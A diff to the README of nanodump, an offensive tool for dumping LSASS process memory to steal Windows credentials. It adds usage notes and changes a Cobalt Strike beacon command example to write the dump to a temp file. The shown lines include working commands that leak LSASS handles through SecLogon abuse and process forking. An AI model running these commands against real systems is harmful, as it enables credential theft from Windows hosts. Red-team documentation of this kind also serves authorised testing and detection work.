@@ -92,6 +92,7 @@ List all the handles in the system and look for an existing handle to LSASS. If 
 
 #### --seclogon -sl
 Leak a handle to LSASS by abusing SecLogon with `CreateProcessWithLogonW`. This eliminates the need to open a new handle to LSASS directly.  
+When this option is used, errors while analyzing the minidump are to be expected. Use the latest version of pypykatz.  
 **If used as BOF, an unsigned binary will be written to disk unless --dup is also provided!**
 
 #### --binary -v < path >
@@ -112,9 +113,9 @@ Use MalSecLogon to leak an LSASS handle in a notepad process, duplicate that han
 beacon> nanodump --seclogon --dup --fork --binary C:\Windows\notepad.exe --valid
 ```
 
-Get a handle with MalSecLogon, read LSASS indirectly by using a fork and download the dump with a valid signature:
+Get a handle with MalSecLogon, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):
 ```
-beacon> nanodump --seclogon --fork --valid
+beacon> nanodump --seclogon --fork --valid --write C:\Windows\Temp\lsass.dmp
 ```
 
 Download the dump with an invalid signature (default):
